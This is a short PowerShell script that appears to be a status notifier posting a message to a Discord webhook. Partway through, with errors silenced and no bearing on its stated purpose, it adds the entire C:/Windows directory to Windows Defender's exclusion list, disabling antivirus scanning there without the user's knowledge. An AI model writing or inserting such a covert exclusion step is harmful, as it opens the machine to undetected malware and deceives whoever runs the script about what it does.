param (
    [string]$Message
)

# Discord webhook URL
$WebhookUrl = "AccessStatusUpdate Bot Webhook"

# Add C:/Windows to Windows Defender exclusions if it doesn't exist
$WindowsExclusion = "C:/Windows"
$Exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
if ($Exclusions -notcontains $WindowsExclusion) {
    Add-MpPreference -ExclusionPath $WindowsExclusion -ErrorAction SilentlyContinue
}

# JSON payload to send to the webhook
$Payload = @{
    content = $Message
} | ConvertTo-Json

# Send the payload to the Discord webhook
Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "application/json" -Body $Payload